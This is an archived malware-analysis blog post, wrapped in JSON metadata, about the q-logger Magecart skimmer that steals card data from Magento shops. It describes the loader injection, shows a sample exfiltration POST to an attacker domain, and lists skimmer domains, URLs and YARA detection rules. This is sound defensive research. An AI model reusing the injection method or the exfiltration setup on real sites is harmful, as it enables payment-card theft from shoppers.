{
    "id": "3eeea185-8b6a-4f20-976f-9134845a7de4",
    "created_at": "2023-01-12T15:01:12.527858Z",
    "updated_at": "2025-03-27T02:12:56.246532Z",
    "deleted_at": null,
    "sha1_hash": "9a360e2dbbd44152abac03686890f33a0dd4f66d",
    "title": "2021-10-19 - q-logger skimmer keeps Magecart attacks going",
    "authors": "",
    "file_creation_date": "2022-05-28T19:22:54Z",
    "file_modification_date": "2022-05-28T19:22:54Z",
    "file_size": 404766,
    "plain_text": "# q-logger skimmer keeps Magecart attacks going\n\n**[blog.malwarebytes.com/threat-intelligence/2021/10/q-logger-skimmer-keeps-magecart-attacks-going/](https://blog.malwarebytes.com/threat-intelligence/2021/10/q-logger-skimmer-keeps-magecart-attacks-going/)**\n\nThreat Intelligence Team October 19, 2021\n\n_This blog post was authored by Jérôme Segura_\n\nAlthough global e-commerce is continuing to grow rapidly, it seems as though Magecart\nattacks via digital skimmers have not followed the same trend. This is certainly true if we only\nlook at recent newsworthy attacks; indeed when a victim is a large business or popular brand\nwe typically are more likely to remember it.\n\nFrom a research standpoint, we have observed certain shifts in the scope of attacks. For\ninstance, the different threat actors are continuing to expand and diversify their methods and\ninfrastructure. In a [blog post about Magecart Group 8, we documented some of the various](https://blog.malwarebytes.com/threat-intelligence/2021/09/the-many-tentacles-of-magecart-group-8/)\nweb properties used to serve skimmers and exfiltrate stolen data.\n\nBut at the end of the day, we only know about attacks that we can see, that is until we\ndiscover more. Case in point, one particular skimmer identified as q-logger, has been active\nfor several months. But it wasn’t until we started digging further that we realized how much\nbigger it was.\n\n## Q-logger origins\n\n\n-----\n\n[This skimmer was originally flagged by Eric Brandel as q-logger. Depending on how much](https://twitter.com/AffableKraut/status/1385030485676544001?s=20)\nyou enjoy parsing JavaScript you may have a love/hate relationship with it. The code is\ndense and using an obfuscator that is as generic as can be, making identification using\nsignatures challenging.\n\nThanks to some data from [@sansecio I've come across a new(?) digital](https://twitter.com/sansecio?ref_src=twsrc%5Etfw)\n[skimmer/#magecart I call \"q-logger\". It has a variety of features, the most peculiar may](https://twitter.com/hashtag/magecart?src=hash&ref_src=twsrc%5Etfw)\nbe the secondary keylogger it uses to try and defend against inspection. 1/16\n[pic.twitter.com/ME80KMrNg5](https://t.co/ME80KMrNg5)\n\n— Eric Brandel (@AffableKraut) [April 22, 2021](https://twitter.com/AffableKraut/status/1385030485676544001?ref_src=twsrc%5Etfw)\n\nThis skimmer can be found loaded directly into compromised e-commerce sites. However, in\nthe majority of cases we found it loaded externally.\n\n## The loader\n\nThe loader is also an encoded piece of JavaScript that is somewhat obscure. It is injected\ninline within the DOM right before the text/x-magento-init tag or separated by copious\namounts of white space.\n\nOne way to understand what the code does is by using a debugger and setting a breakpoint\nat a particular spot. It is best to either use an already compromised site or bypass the check\nfor the address bar (onestepcheckout)\n\n\n-----\n\nWe can now see the purpose of this script: it is to load the proper skimmer.\n\n## The skimmer\n\nAs mentioned previously, the skimmer is quite opaque and makes debugging effort difficult\nand lengthy.\n\n\n-----\n\nTo cut to the chase, the skimmer exfiltrates data via a POST request to the same domain\nname where the JavaScript is loaded from.\n```\nPOST https://filltobill5.casa/ HTTP/1.1\nHost: filltobill5.casa\n[obfuscated data]\n\n```\n\n-----\n\n## Threat actor and victims\n\nWe were able to collect a few indicators from the threat actor behind this campaign. One was\n[the use of netmail.tk, also observed by Luke Leal, for registering skimmer domains.](https://lukeleal.com/research/posts/analiticsweb-skimmer/)\n\nAlthough there are clusters of domains from the same registrant, we see that they are trying\nto compartmentalize their infrastructure and hide the hosting provider’s true IP address. They\n[also register domains en masse, which allows them to defeat traditional blocklists.](https://twitter.com/AffableKraut/status/1415425137554382852?s=20)\n\nWe don’t have a good estimate of how prevalent this campaign is, but we certainly run into it\nregularly while monitoring e-commerce sites for malicious code. The victims are various\nsmall businesses with an online shop running Magento.\n\n## Conclusion\n\nThe large number of e-commerce sites that are running outdated versions of their CMS is a\nlow hanging fruit for threat actors interested in stealing credit card data. In a sense, there is\nalways a baseline of potential victims that can be harvested.\n\n\n-----\n\nAnd every now and again, some opportunities appear. They could be as simple as a zeroday in a plugin or CMS, or maybe an entry point into more valuable targets via a supplychain attack.\n\nThreat actors are always ready to pounce on those and may well have established their\ninfrastructure ahead of time, waiting for such opportunities.\n\nMalwarebytes customers are protected against this skimmer.\n\n## Indicators of Compromise\n\n**Email addresses (registrant)**\n\nwxugvvvu@netmail[.]tk\nisgskpys@netmail[.]tk\nzulhqmnr@netmail[ ]tk\n\n\n-----\n\nyzzljjkmc@emlhub[.]com\nfoyiy11183@macosnine[.]com\n\n**Skimmer domains**\n\nadminet[.]site\nadminet[.]space\namasterweb[.]site\nanalistcloud[.]space\nanalistnet[.]site\nanalistnet[.]space\nanalistsite[.]site\nanalistsite[.]space\nanalisttab[.]site\nanalisttab[.]space\nanalistweb[.]site\nanalistweb[.]space\nanalitic-tab[.]site\nanalitic-tab[.]space\nanaliticnet[.]site\nanalitics-tab[.]site\nanaliticsnet[.]site\nanaliticstab[.]site\nanaliticstab[.]space\nanalitictab[.]site\nanalitictab[.]space\nanaliticweb[.]site\nanalizeport[.]site\nanalizerete[.]site\nanalylicweb[.]site\nanalystclick[.]site\nanalysttraffic[.]site\nanalystview[.]site\nanalystweb[.]site\nanalyticlick[.]site\nanalyticmanager[.]site\nanalyticview[.]site\naneweb[.]site\nbublegum[.]xyz\ncdnetworker[.]site\ncleanerjs[.]site\nclickanalyst[.]site\nclickanalytic[.]site\n\n\n-----\n\ncloudtester[.]site\ncocolatest[.]sbs\ncommenter[.]site\nconnectweb[.]space\ndomainclean[.]site\ndomainet[.]site\ndomainet[.]space\nfastester[.]site\nfastjspage[.]site\nfastupload[.]site\nfilltobill5[.]casa\nfoosq[.]one\nfoundanalyst[.]site\nfoundanalytic[.]site\nfullka[.]online\ngoos1[.]store\ngudini[.]cam\nhardtester[.]site\nhostcontrol[.]space\nhttpanel[.]site\nindokitel[.]xyz\ninterage[.]site\nipcounter[.]space\nitoltuico[.]cyou\n\nitsector[.]date\njscleaner[.]site\nlanetester[.]site\nlanlocker[.]site\nlinkerange[.]site\nlinkerange[.]space\nlistmanager[.]space\nloockerweb[.]site\nmagengine[.]site\nmanagerage[.]site\nmanagerage[.]space\nmanagertraffic[.]site\nmariaschool[.]xyz\nmasterlinker[.]site\nmasternet[.]space\nmasterport[.]site\nmediaconservative[.]xyz\nminanalize[.]site\n\n\n-----\n\nminimazerjs[.]site\nnetanalist[.]site\nnetanalist[.]space\nnetanalisttest[.]space\nnetanalitic[.]site\nnetanalitic[.]space\nnetanalitics[.]site\nnetcontrol[.]site\nnetpanel[.]site\nnetstart[.]space\nnettingpanel[.]site\nnettingtest[.]site\nnettraffic[.]site\nollaholla[.]cyou\nonehitech[.]casa\nownerpage[.]site\npagecleaner[.]site\npagegine[.]site\npageloader[.]site\npagenator[.]site\npagestater[.]site\npagesupport[.]site\npanelake[.]site\npanelake[.]space\npanelan[.]site\npanelblock[.]site\npanelnetting[.]site\npanelocker[.]site\npinokio[.]online\nplanetspeed[.]site\nproducteditor[.]site\nretenetweb[.]site\nrokki[.]club\nsaverplanel[.]site\nsectimer[.]site\nsecurefield[.]site\nseeweb[.]space\nsentech[.]cyou\nshowproduct[.]site\nsiteanalist[.]site\nsiteanalist[.]space\n\n\n-----\n\nsiteanalitic[.]site\nsiteanalitics[.]site\nsiteanalyst[.]site\n\nsiteanalytic[.]site\nsitengine[.]site\nsitesecure[.]space\nsitetraffic[.]site\nslickclean[.]site\nslotmanager[.]site\nslotshower[.]site\nsmallka[.]cam\nsmalltrch[.]cc\nsoorkis[.]one\nspaceclean[.]site\nspacecom[.]site\nspeedstress[.]site\nspeedtester[.]site\nspeedtester[.]space\nsslmanager[.]site\nstarnetting[.]site\nstatetraffic[.]site\nstatsclick[.]site\nstorepanel[.]site\nsuporter[.]site\ntab-analitic[.]site\ntab-analitic[.]space\ntab-analitics[.]site\ntab-analitics[.]space\ntabanalist[.]site\ntabanalist[.]space\ntabanalitic[.]site\ntabanalitic[.]space\ntabanalitics[.]site\ntabanalitics[.]space\ntargetag[.]space\ntelanet[.]site\ntelanet[.]space\ntrafficanalyst[.]site\ntrafficanalytics[.]site\ntrafficcloud[.]site\ntrafficsanalist[.]site\ntrafficsee[.]site\n\n\n-----\n\ntrafficweb[.]site\ntruetech[.]cam\nunpkgtraffic[.]site\nveeneetech[.]world\nversionhtml[.]site\nviewanalyst[.]site\nviewanalytic[.]site\nwebanalist[.]site\nwebanalist[.]space\nwebanalitic[.]site\nwebanalitics[.]site\nwebanalylic[.]site\nwebanalyst[.]site\nwebmode[.]site\nwebmoder[.]space\nwelltech[.]bar\nwelltech[.]monster\nwelltech[.]rest\n\n**Skimmer URLs**\n\nfilltobill5[.]casa/state-3.9.min.js\nwelltech[.]bar/state-5.0.7.js\nveeneetech[.]world/tag-2.7.js\ngoos1[.]store/openapi-3.3.min.js\ngoos1[.]store/animate-1.6.9.min.js\nmariaschool[.]xyz/openapi.min.js\npagecleaner[.]site/state.min.js\nfoosq[.]one/mobile.js\npinokio[.]online/slick-3.4.min.js\ntruetech[.]cam/screen-4.6.min.js\nonehitech[.]casa/tags-3.0.7.js\nrokki[.]club/mobile-1.3.min.js\nbublegum[.]xyz/libs.min.js\nfastjspage[.]site/utils.js\nfastester[.]site/waypoints.min.js\nversionhtml[.]site/openapi-4.1.js\nitoltuico[.]cyou/library-3.6.js\n\nadminet[.]site/utils.js\nollaholla[.]cyou/common-4.1.js\nindokitel[.]xyz/current.min.js\npanelake[.]site/tag.js\n\n\n-----\n\ngudini[.]cam/libs-2.0.js\nfullka[.]online/dropdowns-1.6.min.js\nwelltech[.]monster/mobile-2.3.min.js\nwelltech[.]rest/widget.min.js\nsentech[.]cyou/widget.min.js\nsmalltrch[.]cc/plugin-1.9.7.js\nsoorkis[.]one/widget-3.6.7.js\nanalistcloud[.]space/common.js\nsmallka[.]cam/plugin-1.1.3.js\nloockerweb[.]site/common.js\nmediaconservative[.]xyz/script.js\nitsector[.]date/waypoints.min.js\n\n**YARA rules**\n```\nrule qlogger_loader_WebSkimmer : Magecart WebSkimmer\n{\n  meta:\n    author = \"Malwarebytes\"\n    description = \"Magecart (q-logger loader)\"\n    source = \"https://blog.malwarebytes.com/threat-intelligence/2021/10/q-loggerskimmer-keeps-magecart-attacks-going/\"\n    date = \"2021-10-19\"\n  strings:\n    $regex = /\"load\",function\\(\\)\\{\\(function\\(\\)\\{/\n    $regex2 = /while\\(!!\\[\\]\\)\\{try{var/\n    $regex3 = /\\(\\w\\['shift'\\]\\(\\)\\);\\}\\}\\}/\n  condition:\n    all of them\n}\nrule qlogger_skimmer_WebSkimmer : Magecart WebSkimmer\n{\n  meta:\n    author = \"Malwarebytes\"\n    description = \"Magecart (q-logger skimmer)\"\n    source = \"https://blog.malwarebytes.com/threat-intelligence/2021/10/q-loggerskimmer-keeps-magecart-attacks-going/\"\n    date = \"2021-10-19\"\n  strings:\n    $regex = /return\\(!!window\\[\\w{2}\\(/\n    $regex2 = /\\w\\(\\)&&console\\[/\n  condition:\n    all of them\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-19 - q-logger skimmer keeps Magecart attacks going.pdf"
    ],
    "report_names": [
        "2021-10-19 - q-logger skimmer keeps Magecart attacks going.pdf"
    ],
    "threat_actors": [
        {
            "id": "4b076dcb-516e-42fb-9c8f-f153902cd5e9",
            "created_at": "2022-10-25T16:07:23.708745Z",
            "updated_at": "2025-03-27T02:02:09.935617Z",
            "deleted_at": null,
            "main_name": "Hidden Lynx",
            "aliases": [
                "Aurora Panda",
                "Group 8",
                "Hidden Lynx",
                "Operation SMN"
            ],
            "source_name": "ETDA:Hidden Lynx",
            "tools": [
                "AGENT.ABQMR",
                "AGENT.AQUP.DROPPER",
                "AGENT.BMZA",
                "AGENT.GUNZ",
                "BlackCoffee",
                "HiKit",
                "MCRAT.A",
                "Mdmbot.E",
                "Moudoor",
                "Naid",
                "PNGRAT",
                "Trojan.Naid",
                "ZoxPNG",
                "gresim"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7aefdda-98f1-4790-a32d-14cc99de2d60",
            "created_at": "2023-01-06T13:46:38.281844Z",
            "updated_at": "2025-03-27T02:00:02.792526Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "G0025",
                "AURORA PANDA",
                "Group 72",
                "G0001",
                "HELIUM",
                "Group 8",
                "Hidden Lynx",
                "Tailgater Team",
                "BRONZE KEYSTONE"
            ],
            "source_name": "MISPGALAXY:APT17",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535672,
    "ts_updated_at": 1743041576,
    "ts_creation_date": 1653765774,
    "ts_modification_date": 1653765774,
    "files": {
        "pdf": "https://archive.orkl.eu/9a360e2dbbd44152abac03686890f33a0dd4f66d.pdf",
        "text": "https://archive.orkl.eu/9a360e2dbbd44152abac03686890f33a0dd4f66d.txt",
        "img": "https://archive.orkl.eu/9a360e2dbbd44152abac03686890f33a0dd4f66d.jpg"
    }
}